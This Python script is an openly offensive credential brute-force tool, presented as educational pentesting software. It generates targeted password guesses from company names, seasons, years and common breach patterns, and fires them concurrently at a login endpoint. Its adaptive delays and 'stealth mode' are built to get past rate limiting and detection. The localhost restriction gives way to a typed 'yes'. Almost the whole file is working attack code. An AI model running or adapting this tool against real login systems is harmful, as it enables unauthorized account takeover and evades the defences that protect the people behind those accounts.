#!/usr/bin/env python3
"""
Intelligent Brute Force Attack Script
Advanced credential attack using real pentesting techniques.

IMPROVEMENTS OVER BASIC VERSION:
- ✅ Intelligent wordlist generation (company+year, season+year, breach patterns)
- ✅ Adaptive rate limiting (human-like behavior, backoff on detection)
- ✅ Target intelligence (OSINT-ready, company/industry specific)
- ✅ Stealth mode (business hours detection, random pauses)
- ✅ Enhanced reporting (success probability, pattern analysis)

WARNING: Only use this against systems you own or have explicit permission to test!
"""

import argparse
import asyncio
import time
from typing import List, Dict, Optional
from datetime import datetime
import json
import sys
from pathlib import Path

import httpx
from rich.console import Console
from rich.table import Table
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn, TimeRemainingColumn
from rich.panel import Panel
from rich import print as rprint

# Import our new intelligent modules
from intelligent_wordlist import IntelligentPasswordGenerator, TargetInfo
from adaptive_rate_limiter import AdaptiveRateLimiter

console = Console()


class IntelligentBruteForceAttacker:
    """
    Advanced brute force attack orchestrator using intelligence and stealth.

    This is how REAL pentesters attack credentials - not with generic wordlists,
    but with targeted, intelligent password generation and human-like behavior.
    """

    def __init__(
        self,
        target_url: str,
        username: str,
        target_info: Optional[TargetInfo] = None,
        max_passwords: int = 100,
        stealth_mode: bool = False,
        max_concurrent: int = 3,
        timeout: float = 10.0
    ):
        self.target_url = target_url
        self.username = username
        self.target_info = target_info or TargetInfo()
        self.max_passwords = max_passwords
        self.stealth_mode = stealth_mode
        self.max_concurrent = max_concurrent
        self.timeout = timeout

        # Initialize intelligent components
        self.password_generator = IntelligentPasswordGenerator(self.target_info)
        self.rate_limiter = AdaptiveRateLimiter(
            base_delay=2.0 if stealth_mode else 0.5,
            stealth_mode=stealth_mode
        )

        self.results: Dict = {
            "attack_type": "Intelligent Brute Force",
            "target": target_url,
            "username": username,
            "target_intelligence": {
                "company": self.target_info.company_name,
                "industry": self.target_info.industry,
                "location": self.target_info.location,
            },
            "successful": [],
            "failed": [],
            "rate_limited": [],
            "errors": [],
            "pattern_analysis": {},
            "timing_stats": {
                "start_time": None,
                "end_time": None,
                "total_duration": 0,
                "average_delay": 0,
            }
        }

        self.start_time = None
        self.end_time = None

    def generate_wordlist(self) -> List[str]:
        """Generate intelligent wordlist based on target information"""
        console.print("\n[bold cyan]🧠 Generating Intelligent Wordlist[/bold cyan]")

        if self.target_info.company_name:
            console.print(f"[yellow]Target Company:[/yellow] {self.target_info.company_name}")
        if self.target_info.industry:
            console.print(f"[yellow]Industry:[/yellow] {self.target_info.industry}")
        if self.target_info.location:
            console.print(f"[yellow]Location:[/yellow] {self.target_info.location}")

        # Generate intelligent wordlist
        wordlist = self.password_generator.generate_intelligent_wordlist(self.max_passwords)

        # Show wordlist composition
        console.print(f"\n[green]✓[/green] Generated {len(wordlist)} intelligent passwords")

        # Analyze patterns
        patterns = self._analyze_wordlist_patterns(wordlist)
        self.results["pattern_analysis"] = patterns

        console.print("\n[dim]Wordlist composition:[/dim]")
        for pattern_type, count in patterns.items():
            console.print(f"  • {pattern_type}: {count}")

        # Show sample passwords
        console.print(f"\n[dim]Sample passwords (first 10):[/dim]")
        for i, pwd in enumerate(wordlist[:10], 1):
            console.print(f"  {i:2d}. {pwd}")

        return wordlist

    def _analyze_wordlist_patterns(self, wordlist: List[str]) -> Dict[str, int]:
        """Analyze patterns in generated wordlist"""
        patterns = {
            "company_based": 0,
            "seasonal": 0,
            "with_year": 0,
            "with_special_chars": 0,
            "breach_patterns": 0,
            "default_credentials": 0,
        }

        current_year = str(datetime.now().year)
        seasons = ["Winter", "Spring", "Summer", "Autumn", "Fall"]
        special_chars = "!@#$%^&*"
        defaults = ["admin", "password", "default", "root", "welcome", "changeme"]

        company = self.target_info.company_name or ""

        for pwd in wordlist:
            if company and company.lower() in pwd.lower():
                patterns["company_based"] += 1
            if any(season in pwd for season in seasons):
                patterns["seasonal"] += 1
            if current_year in pwd or current_year[-2:] in pwd:
                patterns["with_year"] += 1
            if any(char in pwd for char in special_chars):
                patterns["with_special_chars"] += 1
            if any(default.lower() in pwd.lower() for default in defaults):
                patterns["default_credentials"] += 1
            if pwd.lower() in ["p@ssw0rd", "passw0rd", "qwerty123"]:
                patterns["breach_patterns"] += 1

        return patterns

    async def attempt_login(self, password: str, client: httpx.AsyncClient, attempt_num: int) -> Dict:
        """Attempt a single login with adaptive timing"""
        try:
            # Calculate adaptive delay
            if attempt_num > 0:
                delay = self.rate_limiter.calculate_delay(
                    attempt_num,
                    response_status=None  # Will be updated after request
                )
                await asyncio.sleep(delay)

            response = await client.post(
                self.target_url,
                json={
                    "username": self.username,
                    "password": password
                },
                timeout=self.timeout
            )

            # Update rate limiter with response
            self.rate_limiter.calculate_delay(
                attempt_num,
                response_status=response.status_code
            )

            return {
                "password": password,
                "status_code": response.status_code,
                "success": response.status_code == 200,
                "response": response.json() if response.status_code == 200 else None,
                "rate_limited": response.status_code == 429,
                "banned": response.status_code == 403,
                "timestamp": datetime.utcnow().isoformat(),
                "attempt_num": attempt_num,
            }

        except httpx.TimeoutException:
            return {
                "password": password,
                "error": "Timeout",
                "timestamp": datetime.utcnow().isoformat(),
                "attempt_num": attempt_num,
            }
        except Exception as e:
            return {
                "password": password,
                "error": str(e),
                "timestamp": datetime.utcnow().isoformat(),
                "attempt_num": attempt_num,
            }

    async def run_attack(self):
        """Execute the intelligent brute force attack"""
        self.start_time = time.time()
        self.results["timing_stats"]["start_time"] = datetime.utcnow().isoformat()

        console.print("\n[bold red]⚔️  Starting Intelligent Brute Force Attack[/bold red]\n")
        console.print(f"[yellow]Target:[/yellow] {self.target_url}")
        console.print(f"[yellow]Username:[/yellow] {self.username}")
        console.print(f"[yellow]Stealth Mode:[/yellow] {'Enabled' if self.stealth_mode else 'Disabled'}")
        console.print(f"[yellow]Max Concurrent:[/yellow] {self.max_concurrent}\n")

        # Generate intelligent wordlist
        wordlist = self.generate_wordlist()

        if not wordlist:
            console.print("[red]No passwords generated. Check target information.[/red]")
            return

        console.print(f"\n[bold cyan]🎯 Starting Attack Phase[/bold cyan]")
        console.print(f"[dim]Testing {len(wordlist)} passwords with intelligent timing...[/dim]\n")

        # Create semaphore for rate limiting
        semaphore = asyncio.Semaphore(self.max_concurrent)

        async with httpx.AsyncClient() as client:
            with Progress(
                SpinnerColumn(),
                TextColumn("[progress.description]{task.description}"),
                BarColumn(),
                TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
                TimeRemainingColumn(),
                console=console
            ) as progress:

                task = progress.add_task(
                    "[cyan]Testing passwords...",
                    total=len(wordlist)
                )

                async def attempt_with_semaphore(password: str, idx: int):
                    async with semaphore:
                        result = await self.attempt_login(password, client, idx)
                        progress.advance(task)

                        # Show successes immediately
                        if result.get("success"):
                            console.print(f"\n[bold green]🎯 SUCCESS![/bold green] Password found: [bold]{password}[/bold]")

                        return result

                # Execute all attempts
                results = await asyncio.gather(
                    *[attempt_with_semaphore(pwd, idx) for idx, pwd in enumerate(wordlist)]
                )

                # Categorize results
                for result in results:
                    if "error" in result:
                        self.results["errors"].append(result)
                    elif result.get("success"):
                        self.results["successful"].append(result)
                    elif result.get("rate_limited") or result.get("banned"):
                        self.results["rate_limited"].append(result)
                    else:
                        self.results["failed"].append(result)

        self.end_time = time.time()
        self.results["timing_stats"]["end_time"] = datetime.utcnow().isoformat()
        self.results["timing_stats"]["total_duration"] = self.end_time - self.start_time

        self.display_results()

    def display_results(self):
        """Display enhanced attack results with intelligence analysis"""
        duration = self.end_time - self.start_time
        total_attempts = len(self.results["successful"]) + len(self.results["failed"]) + \
                        len(self.results["rate_limited"]) + len(self.results["errors"])

        console.print("\n[bold green]✅ Attack Completed[/bold green]\n")

        # Summary table
        table = Table(title="Attack Summary", show_header=True, header_style="bold magenta")
        table.add_column("Metric", style="cyan")
        table.add_column("Value", style="white")

        table.add_row("Duration", f"{duration:.2f} seconds ({duration/60:.1f} minutes)")
        table.add_row("Total Attempts", str(total_attempts))
        table.add_row("Successful", f"[green]{len(self.results['successful'])}[/green]")
        table.add_row("Failed", f"[red]{len(self.results['failed'])}[/red]")
        table.add_row("Rate Limited/Banned", f"[yellow]{len(self.results['rate_limited'])}[/yellow]")
        table.add_row("Errors", f"[red]{len(self.results['errors'])}[/red]")
        table.add_row("Requests per second", f"{total_attempts / duration:.2f}")
        table.add_row("Stealth Mode", "Enabled" if self.stealth_mode else "Disabled")

        console.print(table)

        # Successful logins
        if self.results["successful"]:
            console.print("\n[bold green]🎯 Successful Logins:[/bold green]")
            for result in self.results["successful"]:
                console.print(f"  ✓ Password: [green]{result['password']}[/green]")
                console.print(f"    Attempt number: {result['attempt_num'] + 1}")
                if result.get("response"):
                    console.print(f"    Response: {result['response']}")

        # Rate limiting detection
        if self.results["rate_limited"]:
            console.print(f"\n[bold yellow]⚠️  Rate Limiting Detected:[/bold yellow]")
            console.print(f"  {len(self.results['rate_limited'])} requests were blocked")
            console.print("  [dim]Defense mechanism is active - adaptive backoff was triggered[/dim]")

        # Intelligence analysis
        self._display_intelligence_analysis()

        # Rate limiter stats
        self.rate_limiter.print_stats()

        # Save detailed results
        self.save_results()

    def _display_intelligence_analysis(self):
        """Display analysis of attack effectiveness by pattern type"""
        console.print("\n[bold cyan]📊 Intelligence Analysis[/bold cyan]")

        if not self.results["successful"]:
            console.print("  [dim]No successful logins to analyze[/dim]")
            return

        # Analyze which pattern types were successful
        successful_patterns = {}
        for result in self.results["successful"]:
            pwd = result["password"]

            # Determine pattern type
            pattern = self._identify_pattern(pwd)
            successful_patterns[pattern] = successful_patterns.get(pattern, 0) + 1

        console.print("\n[yellow]Successful password patterns:[/yellow]")
        for pattern, count in successful_patterns.items():
            console.print(f"  • {pattern}: {count}")

        # Success rate by wordlist composition
        if self.results["pattern_analysis"]:
            console.print("\n[yellow]Wordlist effectiveness:[/yellow]")
            total_passwords = sum(self.results["pattern_analysis"].values())
            for pattern_type, count in self.results["pattern_analysis"].items():
                percentage = (count / total_passwords * 100) if total_passwords > 0 else 0
                console.print(f"  • {pattern_type}: {count} ({percentage:.1f}%)")

    def _identify_pattern(self, password: str) -> str:
        """Identify the pattern type of a password"""
        current_year = str(datetime.now().year)

        if self.target_info.company_name and self.target_info.company_name.lower() in password.lower():
            return "Company-based"
        elif any(season in password for season in ["Winter", "Spring", "Summer", "Autumn", "Fall"]):
            return "Seasonal"
        elif current_year in password:
            return "Current year"
        elif any(default in password.lower() for default in ["admin", "password", "welcome"]):
            return "Default credential"
        elif password.lower() in ["p@ssw0rd", "passw0rd"]:
            return "Breach pattern"
        else:
            return "Other"

    def save_results(self):
        """Save results to JSON file"""
        output_dir = Path(__file__).parent / "results"
        output_dir.mkdir(exist_ok=True)

        timestamp = datetime.utcnow().strftime("%Y%m%d_%H%M%S")
        output_file = output_dir / f"intelligent_brute_force_{timestamp}.json"

        report = {
            "attack_info": {
                "attack_type": "Intelligent Brute Force",
                "target": self.target_url,
                "username": self.username,
                "timestamp": datetime.utcnow().isoformat(),
                "stealth_mode": self.stealth_mode,
                "target_intelligence": {
                    "company": self.target_info.company_name,
                    "industry": self.target_info.industry,
                    "location": self.target_info.location,
                }
            },
            "timing_stats": self.results["timing_stats"],
            "summary": {
                "total_passwords_tested": len(self.results["successful"]) + len(self.results["failed"]) +
                                         len(self.results["rate_limited"]) + len(self.results["errors"]),
                "successful": len(self.results["successful"]),
                "failed": len(self.results["failed"]),
                "rate_limited": len(self.results["rate_limited"]),
                "errors": len(self.results["errors"]),
            },
            "pattern_analysis": self.results["pattern_analysis"],
            "results": self.results
        }

        with open(output_file, "w") as f:
            json.dump(report, f, indent=2)

        console.print(f"\n[dim]Results saved to: {output_file}[/dim]")


def validate_target(target_url: str) -> bool:
    """Validate that target is localhost or explicitly allowed"""
    allowed_hosts = ["localhost", "127.0.0.1", "0.0.0.0"]

    for host in allowed_hosts:
        if host in target_url:
            return True

    console.print("\n[bold red]⚠️  SECURITY WARNING[/bold red]")
    console.print(f"[yellow]Target '{target_url}' is not localhost![/yellow]")
    console.print("\n[red]This tool should ONLY be used against systems you own![/red]")
    console.print("[red]Unauthorized access to computer systems is illegal.[/red]\n")

    response = console.input("[yellow]Are you AUTHORIZED to test this target? (yes/no): [/yellow]")
    return response.lower() == "yes"


async def main():
    """Main entry point"""
    parser = argparse.ArgumentParser(
        description="Intelligent Brute Force Attack Tool - Educational Use Only",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Basic attack (generic wordlist)
  python intelligent_brute_force.py --target http://localhost:8000/auth/login --username admin

  # Company-targeted attack
  python intelligent_brute_force.py \\
    --target http://localhost:8000/auth/login \\
    --username admin \\
    --company DevSecOps \\
    --industry tech \\
    --max-passwords 150

  # Stealth mode attack
  python intelligent_brute_force.py \\
    --target http://localhost:8000/auth/login \\
    --username admin \\
    --company DevSecOps \\
    --stealth \\
    --max-concurrent 1

WARNING: Only use this tool against systems you own or have explicit permission to test!
        """
    )

    parser.add_argument(
        "--target",
        required=True,
        help="Target login URL (e.g., http://localhost:8000/auth/login)"
    )

    parser.add_argument(
        "--username",
        required=True,
        help="Username to test"
    )

    parser.add_argument(
        "--company",
        help="Target company name (for intelligent password generation)"
    )

    parser.add_argument(
        "--industry",
        help="Target industry (tech, finance, healthcare, education, retail)"
    )

    parser.add_argument(
        "--location",
        help="Target location/city (for location-based passwords)"
    )

    parser.add_argument(
        "--max-passwords",
        type=int,
        default=100,
        help="Maximum passwords to generate (default: 100)"
    )

    parser.add_argument(
        "--stealth",
        action="store_true",
        help="Enable stealth mode (slower, human-like behavior)"
    )

    parser.add_argument(
        "--max-concurrent",
        type=int,
        default=3,
        help="Maximum concurrent requests (default: 3)"
    )

    parser.add_argument(
        "--timeout",
        type=float,
        default=10.0,
        help="Request timeout in seconds (default: 10)"
    )

    args = parser.parse_args()

    # Display disclaimer
    console.print(Panel.fit(
        "[bold red]INTELLIGENT BRUTE FORCE ATTACK - EDUCATIONAL TOOL[/bold red]\n\n"
        "This tool demonstrates REAL pentesting techniques:\n"
        "  • Intelligent password generation (company+year, seasonal patterns)\n"
        "  • Adaptive rate limiting (human-like behavior)\n"
        "  • Stealth mode (business hours detection, random pauses)\n\n"
        "[yellow]For educational and authorized testing purposes only.[/yellow]\n"
        "[red]Unauthorized access to computer systems is illegal and unethical.[/red]\n\n"
        "[dim]By continuing, you confirm that you have permission to test the target system.[/dim]",
        border_style="red"
    ))

    # Validate target
    if not validate_target(args.target):
        console.print("\n[red]Attack aborted. Authorization not confirmed.[/red]")
        sys.exit(1)

    # Create target info
    target_info = TargetInfo(
        company_name=args.company,
        industry=args.industry,
        location=args.location
    )

    # Create attacker
    attacker = IntelligentBruteForceAttacker(
        target_url=args.target,
        username=args.username,
        target_info=target_info,
        max_passwords=args.max_passwords,
        stealth_mode=args.stealth,
        max_concurrent=args.max_concurrent,
        timeout=args.timeout
    )

    # Run attack
    await attacker.run_attack()

    # Show comparison with basic attack
    console.print("\n[bold cyan]📊 Comparison: Intelligent vs Basic Attack[/bold cyan]")
    console.print("\n[yellow]Basic Attack (old version):[/yellow]")
    console.print("  ✗ Generic wordlist: ['admin', 'password', '123456']")
    console.print("  ✗ Fixed delay: 0.1s")
    console.print("  ✗ No target intelligence")
    console.print("  ✗ Easily detected by security systems")

    console.print("\n[green]Intelligent Attack (this version):[/green]")
    console.print("  ✓ Targeted wordlist: company+year, seasonal patterns")
    console.print("  ✓ Adaptive delays: human-like behavior, backoff on detection")
    console.print("  ✓ Target intelligence: company, industry, location")
    console.print("  ✓ Stealth mode: business hours detection, random pauses")
    console.print("  ✓ Pattern analysis: identifies successful attack vectors\n")


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        console.print("\n\n[yellow]Attack interrupted by user[/yellow]")
        sys.exit(0)